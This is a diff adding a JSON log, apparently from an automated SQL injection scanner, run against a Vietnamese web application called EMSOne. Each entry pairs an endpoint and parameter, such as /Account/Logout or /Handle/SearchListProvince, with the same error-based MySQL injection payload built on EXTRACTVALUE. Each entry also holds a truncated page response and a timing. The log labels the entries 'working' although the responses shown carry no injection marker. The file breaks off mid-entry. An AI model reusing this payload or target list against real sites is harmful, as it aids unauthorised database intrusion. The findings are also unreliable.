@@ -1,0 +1,1157 @@
+{
+  "working": [
+    {
+      "method": "GET",
+      "endpoint": "/Account/RegisterView",
+      "param": "ID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<div class=\"modal-dialog modal-register modal-dialog-centered modal-fullscreen-md-down\" role=\"document\">\r\n    <div class=\"modal-content\">\r\n        <div class=\"modal-header\">\r\n            <div class=\"d-flex flex-column\">\r\n                <img src=\"/Assets/images/logo/logo-full.svg\" alt=\"\">\r\n                <h5 class=\"modal-title fs-24 font-w600 mt-2 mb-2\">Đăng ký tài khoản</h5>\r\n            </div>\r\n            <button type=\"button\" class=\"btn-close\" data-bs-dismiss=\"modal\">\r\n            </button>\r\n        </div>\r\n        <div class=\"modal-body pt-0\" id=\"ClearModal\">\r\n            <div class=\"row\">\r\n                <div class=\"col-xl-4 col-lg-4 col-md-4 mb-2\">\r\n                    <label class=\"mb-1\">Tên cửa hàng/công ty</label>\r\n                    <input class=\"form-control text-box single-line\" id=\"StoreName\" maxlength=\"150\" name=\"StoreName\" placeholder=\"\" type=\"text\" value=\"\" />\r\n                    <span class=\"text-danger\" id=\"errStoreName\"></span>\r\n                </div>\r\n         ",
+      "elapsed": 4.272982120513916
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Account/Logout",
+      "param": "GroupPermissionID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n    <meta charset=\"utf-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"keywords\" content=\"\" />\r\n    <meta name=\"author\" content=\"\" />\r\n    <meta name=\"robots\" content=\"\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n    <meta name=\"format-detection\" content=\"telephone=no\">\r\n    <title>EMSOne</title>\r\n    <link rel=\"shortcut icon\" type=\"image/png\" href=\"/favicon.png\" />\r\n    <link href=\"/bundles/css?v=jO6O3ekFDbPEZy9mGOg5MBC2BRJvHh_qP71M2Cka9FM1\" rel=\"stylesheet\"/>\r\n\r\n    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400;500;600;700;900&display=swap\" rel=\"stylesheet\"/>\r\n\r\n    <script src=\"/Assets/js/global.min.js\"></script>\r\n    <script src=\"/Assets/js/MyJS.js?n=4\"></script>\r\n</head>\r\n<body>\r\n    <!-- AJAX LOADER -->\r\n    <div id=\"preloader\">\r\n        <img src=\"/Assets/images/logo/logo-full.svg\" />\r\n    </div>\r\n    <!-- MODAL -->\r\n    <div id=\"ViewModal\" c",
+      "elapsed": 5.426480293273926
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Account/Logout",
+      "param": "Type",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n    <meta charset=\"utf-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"keywords\" content=\"\" />\r\n    <meta name=\"author\" content=\"\" />\r\n    <meta name=\"robots\" content=\"\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n    <meta name=\"format-detection\" content=\"telephone=no\">\r\n    <title>EMSOne</title>\r\n    <link rel=\"shortcut icon\" type=\"image/png\" href=\"/favicon.png\" />\r\n    <link href=\"/bundles/css?v=jO6O3ekFDbPEZy9mGOg5MBC2BRJvHh_qP71M2Cka9FM1\" rel=\"stylesheet\"/>\r\n\r\n    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400;500;600;700;900&display=swap\" rel=\"stylesheet\"/>\r\n\r\n    <script src=\"/Assets/js/global.min.js\"></script>\r\n    <script src=\"/Assets/js/MyJS.js?n=4\"></script>\r\n</head>\r\n<body>\r\n    <!-- AJAX LOADER -->\r\n    <div id=\"preloader\">\r\n        <img src=\"/Assets/images/logo/logo-full.svg\" />\r\n    </div>\r\n    <!-- MODAL -->\r\n    <div id=\"ViewModal\" c",
+      "elapsed": 5.998007535934448
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Account/RegisterView",
+      "param": "Id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<div class=\"modal-dialog modal-register modal-dialog-centered modal-fullscreen-md-down\" role=\"document\">\r\n    <div class=\"modal-content\">\r\n        <div class=\"modal-header\">\r\n            <div class=\"d-flex flex-column\">\r\n                <img src=\"/Assets/images/logo/logo-full.svg\" alt=\"\">\r\n                <h5 class=\"modal-title fs-24 font-w600 mt-2 mb-2\">Đăng ký tài khoản</h5>\r\n            </div>\r\n            <button type=\"button\" class=\"btn-close\" data-bs-dismiss=\"modal\">\r\n            </button>\r\n        </div>\r\n        <div class=\"modal-body pt-0\" id=\"ClearModal\">\r\n            <div class=\"row\">\r\n                <div class=\"col-xl-4 col-lg-4 col-md-4 mb-2\">\r\n                    <label class=\"mb-1\">Tên cửa hàng/công ty</label>\r\n                    <input class=\"form-control text-box single-line\" id=\"StoreName\" maxlength=\"150\" name=\"StoreName\" placeholder=\"\" type=\"text\" value=\"\" />\r\n                    <span class=\"text-danger\" id=\"errStoreName\"></span>\r\n                </div>\r\n         ",
+      "elapsed": 5.331573247909546
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Account/Logout",
+      "param": "user",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n    <meta charset=\"utf-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"keywords\" content=\"\" />\r\n    <meta name=\"author\" content=\"\" />\r\n    <meta name=\"robots\" content=\"\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n    <meta name=\"format-detection\" content=\"telephone=no\">\r\n    <title>EMSOne</title>\r\n    <link rel=\"shortcut icon\" type=\"image/png\" href=\"/favicon.png\" />\r\n    <link href=\"/bundles/css?v=jO6O3ekFDbPEZy9mGOg5MBC2BRJvHh_qP71M2Cka9FM1\" rel=\"stylesheet\"/>\r\n\r\n    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400;500;600;700;900&display=swap\" rel=\"stylesheet\"/>\r\n\r\n    <script src=\"/Assets/js/global.min.js\"></script>\r\n    <script src=\"/Assets/js/MyJS.js?n=4\"></script>\r\n</head>\r\n<body>\r\n    <!-- AJAX LOADER -->\r\n    <div id=\"preloader\">\r\n        <img src=\"/Assets/images/logo/logo-full.svg\" />\r\n    </div>\r\n    <!-- MODAL -->\r\n    <div id=\"ViewModal\" c",
+      "elapsed": 5.971872806549072
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Account/RegisterView",
+      "param": "keyword",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<div class=\"modal-dialog modal-register modal-dialog-centered modal-fullscreen-md-down\" role=\"document\">\r\n    <div class=\"modal-content\">\r\n        <div class=\"modal-header\">\r\n            <div class=\"d-flex flex-column\">\r\n                <img src=\"/Assets/images/logo/logo-full.svg\" alt=\"\">\r\n                <h5 class=\"modal-title fs-24 font-w600 mt-2 mb-2\">Đăng ký tài khoản</h5>\r\n            </div>\r\n            <button type=\"button\" class=\"btn-close\" data-bs-dismiss=\"modal\">\r\n            </button>\r\n        </div>\r\n        <div class=\"modal-body pt-0\" id=\"ClearModal\">\r\n            <div class=\"row\">\r\n                <div class=\"col-xl-4 col-lg-4 col-md-4 mb-2\">\r\n                    <label class=\"mb-1\">Tên cửa hàng/công ty</label>\r\n                    <input class=\"form-control text-box single-line\" id=\"StoreName\" maxlength=\"150\" name=\"StoreName\" placeholder=\"\" type=\"text\" value=\"\" />\r\n                    <span class=\"text-danger\" id=\"errStoreName\"></span>\r\n                </div>\r\n         ",
+      "elapsed": 4.794906377792358
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Account/Logout",
+      "param": "uid",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n    <meta charset=\"utf-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"keywords\" content=\"\" />\r\n    <meta name=\"author\" content=\"\" />\r\n    <meta name=\"robots\" content=\"\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n    <meta name=\"format-detection\" content=\"telephone=no\">\r\n    <title>EMSOne</title>\r\n    <link rel=\"shortcut icon\" type=\"image/png\" href=\"/favicon.png\" />\r\n    <link href=\"/bundles/css?v=jO6O3ekFDbPEZy9mGOg5MBC2BRJvHh_qP71M2Cka9FM1\" rel=\"stylesheet\"/>\r\n\r\n    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400;500;600;700;900&display=swap\" rel=\"stylesheet\"/>\r\n\r\n    <script src=\"/Assets/js/global.min.js\"></script>\r\n    <script src=\"/Assets/js/MyJS.js?n=4\"></script>\r\n</head>\r\n<body>\r\n    <!-- AJAX LOADER -->\r\n    <div id=\"preloader\">\r\n        <img src=\"/Assets/images/logo/logo-full.svg\" />\r\n    </div>\r\n    <!-- MODAL -->\r\n    <div id=\"ViewModal\" c",
+      "elapsed": 6.510468006134033
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Account/RegisterView",
+      "param": "user_id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<div class=\"modal-dialog modal-register modal-dialog-centered modal-fullscreen-md-down\" role=\"document\">\r\n    <div class=\"modal-content\">\r\n        <div class=\"modal-header\">\r\n            <div class=\"d-flex flex-column\">\r\n                <img src=\"/Assets/images/logo/logo-full.svg\" alt=\"\">\r\n                <h5 class=\"modal-title fs-24 font-w600 mt-2 mb-2\">Đăng ký tài khoản</h5>\r\n            </div>\r\n            <button type=\"button\" class=\"btn-close\" data-bs-dismiss=\"modal\">\r\n            </button>\r\n        </div>\r\n        <div class=\"modal-body pt-0\" id=\"ClearModal\">\r\n            <div class=\"row\">\r\n                <div class=\"col-xl-4 col-lg-4 col-md-4 mb-2\">\r\n                    <label class=\"mb-1\">Tên cửa hàng/công ty</label>\r\n                    <input class=\"form-control text-box single-line\" id=\"StoreName\" maxlength=\"150\" name=\"StoreName\" placeholder=\"\" type=\"text\" value=\"\" />\r\n                    <span class=\"text-danger\" id=\"errStoreName\"></span>\r\n                </div>\r\n         ",
+      "elapsed": 6.324691295623779
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Account/Logout",
+      "param": "WareHouseID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n    <meta charset=\"utf-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"keywords\" content=\"\" />\r\n    <meta name=\"author\" content=\"\" />\r\n    <meta name=\"robots\" content=\"\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n    <meta name=\"format-detection\" content=\"telephone=no\">\r\n    <title>EMSOne</title>\r\n    <link rel=\"shortcut icon\" type=\"image/png\" href=\"/favicon.png\" />\r\n    <link href=\"/bundles/css?v=jO6O3ekFDbPEZy9mGOg5MBC2BRJvHh_qP71M2Cka9FM1\" rel=\"stylesheet\"/>\r\n\r\n    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400;500;600;700;900&display=swap\" rel=\"stylesheet\"/>\r\n\r\n    <script src=\"/Assets/js/global.min.js\"></script>\r\n    <script src=\"/Assets/js/MyJS.js?n=4\"></script>\r\n</head>\r\n<body>\r\n    <!-- AJAX LOADER -->\r\n    <div id=\"preloader\">\r\n        <img src=\"/Assets/images/logo/logo-full.svg\" />\r\n    </div>\r\n    <!-- MODAL -->\r\n    <div id=\"ViewModal\" c",
+      "elapsed": 6.96658730506897
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Account/Logout",
+      "param": "Password",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n    <meta charset=\"utf-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"keywords\" content=\"\" />\r\n    <meta name=\"author\" content=\"\" />\r\n    <meta name=\"robots\" content=\"\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n    <meta name=\"format-detection\" content=\"telephone=no\">\r\n    <title>EMSOne</title>\r\n    <link rel=\"shortcut icon\" type=\"image/png\" href=\"/favicon.png\" />\r\n    <link href=\"/bundles/css?v=jO6O3ekFDbPEZy9mGOg5MBC2BRJvHh_qP71M2Cka9FM1\" rel=\"stylesheet\"/>\r\n\r\n    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400;500;600;700;900&display=swap\" rel=\"stylesheet\"/>\r\n\r\n    <script src=\"/Assets/js/global.min.js\"></script>\r\n    <script src=\"/Assets/js/MyJS.js?n=4\"></script>\r\n</head>\r\n<body>\r\n    <!-- AJAX LOADER -->\r\n    <div id=\"preloader\">\r\n        <img src=\"/Assets/images/logo/logo-full.svg\" />\r\n    </div>\r\n    <!-- MODAL -->\r\n    <div id=\"ViewModal\" c",
+      "elapsed": 7.540722846984863
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Account/Logout",
+      "param": "WareHouseID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n    <meta charset=\"utf-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"keywords\" content=\"\" />\r\n    <meta name=\"author\" content=\"\" />\r\n    <meta name=\"robots\" content=\"\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n    <meta name=\"format-detection\" content=\"telephone=no\">\r\n    <title>EMSOne</title>\r\n    <link rel=\"shortcut icon\" type=\"image/png\" href=\"/favicon.png\" />\r\n    <link href=\"/bundles/css?v=jO6O3ekFDbPEZy9mGOg5MBC2BRJvHh_qP71M2Cka9FM1\" rel=\"stylesheet\"/>\r\n\r\n    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400;500;600;700;900&display=swap\" rel=\"stylesheet\"/>\r\n\r\n    <script src=\"/Assets/js/global.min.js\"></script>\r\n    <script src=\"/Assets/js/MyJS.js?n=4\"></script>\r\n</head>\r\n<body>\r\n    <!-- AJAX LOADER -->\r\n    <div id=\"preloader\">\r\n        <img src=\"/Assets/images/logo/logo-full.svg\" />\r\n    </div>\r\n    <!-- MODAL -->\r\n    <div id=\"ViewModal\" c",
+      "elapsed": 7.478411674499512
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Account/Logout",
+      "param": "ProvinceID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n    <meta charset=\"utf-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"keywords\" content=\"\" />\r\n    <meta name=\"author\" content=\"\" />\r\n    <meta name=\"robots\" content=\"\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n    <meta name=\"format-detection\" content=\"telephone=no\">\r\n    <title>EMSOne</title>\r\n    <link rel=\"shortcut icon\" type=\"image/png\" href=\"/favicon.png\" />\r\n    <link href=\"/bundles/css?v=jO6O3ekFDbPEZy9mGOg5MBC2BRJvHh_qP71M2Cka9FM1\" rel=\"stylesheet\"/>\r\n\r\n    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400;500;600;700;900&display=swap\" rel=\"stylesheet\"/>\r\n\r\n    <script src=\"/Assets/js/global.min.js\"></script>\r\n    <script src=\"/Assets/js/MyJS.js?n=4\"></script>\r\n</head>\r\n<body>\r\n    <!-- AJAX LOADER -->\r\n    <div id=\"preloader\">\r\n        <img src=\"/Assets/images/logo/logo-full.svg\" />\r\n    </div>\r\n    <!-- MODAL -->\r\n    <div id=\"ViewModal\" c",
+      "elapsed": 7.999980449676514
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Account/RegisterView",
+      "param": "Id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<div class=\"modal-dialog modal-register modal-dialog-centered modal-fullscreen-md-down\" role=\"document\">\r\n    <div class=\"modal-content\">\r\n        <div class=\"modal-header\">\r\n            <div class=\"d-flex flex-column\">\r\n                <img src=\"/Assets/images/logo/logo-full.svg\" alt=\"\">\r\n                <h5 class=\"modal-title fs-24 font-w600 mt-2 mb-2\">Đăng ký tài khoản</h5>\r\n            </div>\r\n            <button type=\"button\" class=\"btn-close\" data-bs-dismiss=\"modal\">\r\n            </button>\r\n        </div>\r\n        <div class=\"modal-body pt-0\" id=\"ClearModal\">\r\n            <div class=\"row\">\r\n                <div class=\"col-xl-4 col-lg-4 col-md-4 mb-2\">\r\n                    <label class=\"mb-1\">Tên cửa hàng/công ty</label>\r\n                    <input class=\"form-control text-box single-line\" id=\"StoreName\" maxlength=\"150\" name=\"StoreName\" placeholder=\"\" type=\"text\" value=\"\" />\r\n                    <span class=\"text-danger\" id=\"errStoreName\"></span>\r\n                </div>\r\n         ",
+      "elapsed": 8.843515872955322
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Account/RegisterView",
+      "param": "MobileNumber",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<div class=\"modal-dialog modal-register modal-dialog-centered modal-fullscreen-md-down\" role=\"document\">\r\n    <div class=\"modal-content\">\r\n        <div class=\"modal-header\">\r\n            <div class=\"d-flex flex-column\">\r\n                <img src=\"/Assets/images/logo/logo-full.svg\" alt=\"\">\r\n                <h5 class=\"modal-title fs-24 font-w600 mt-2 mb-2\">Đăng ký tài khoản</h5>\r\n            </div>\r\n            <button type=\"button\" class=\"btn-close\" data-bs-dismiss=\"modal\">\r\n            </button>\r\n        </div>\r\n        <div class=\"modal-body pt-0\" id=\"ClearModal\">\r\n            <div class=\"row\">\r\n                <div class=\"col-xl-4 col-lg-4 col-md-4 mb-2\">\r\n                    <label class=\"mb-1\">Tên cửa hàng/công ty</label>\r\n                    <input class=\"form-control text-box single-line\" id=\"StoreName\" maxlength=\"150\" name=\"StoreName\" placeholder=\"\" type=\"text\" value=\"\" />\r\n                    <span class=\"text-danger\" id=\"errStoreName\"></span>\r\n                </div>\r\n         ",
+      "elapsed": 9.824313163757324
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListProvince",
+      "param": "search",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":88,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh An Giang\"},{\"ID\":79,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bà Rịa - Vũng Tàu\"},{\"ID\":82,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Dương\"},{\"ID\":83,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Phước\"},{\"ID\":80,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Thuận\"},{\"ID\":59,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Định\"},{\"ID\":96,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bạc Liêu\"},{\"ID\":23,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bắc Giang\"},{\"ID\":26,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bắc Kạn\"},{\"ID\":22,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bắc Ninh\"},{\"ID\":93,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bến Tre\"},{\"ID\":27,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Cao Bằng\"},{\"ID\":97,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Cà Mau\"},{\"ID\":90,\"Code\":null,\"Title\":null,\"Name\":\"Thành phố Cần Thơ\"},{\"ID\":60,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Gia Lai\"},{\"ID\":31,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Hà Giang\"},{\"ID\":40,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Hà Nam\"}",
+      "elapsed": 4.273746967315674
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchListProvince",
+      "param": "userID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":88,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh An Giang\"},{\"ID\":79,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bà Rịa - Vũng Tàu\"},{\"ID\":82,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Dương\"},{\"ID\":83,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Phước\"},{\"ID\":80,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Thuận\"},{\"ID\":59,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Định\"},{\"ID\":96,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bạc Liêu\"},{\"ID\":23,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bắc Giang\"},{\"ID\":26,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bắc Kạn\"},{\"ID\":22,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bắc Ninh\"},{\"ID\":93,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bến Tre\"},{\"ID\":27,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Cao Bằng\"},{\"ID\":97,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Cà Mau\"},{\"ID\":90,\"Code\":null,\"Title\":null,\"Name\":\"Thành phố Cần Thơ\"},{\"ID\":60,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Gia Lai\"},{\"ID\":31,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Hà Giang\"},{\"ID\":40,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Hà Nam\"}",
+      "elapsed": 5.298344612121582
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "ID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 4.957349061965942
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "customer_id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 4.108413934707642
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "customerID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 4.2203919887542725
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "user_id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
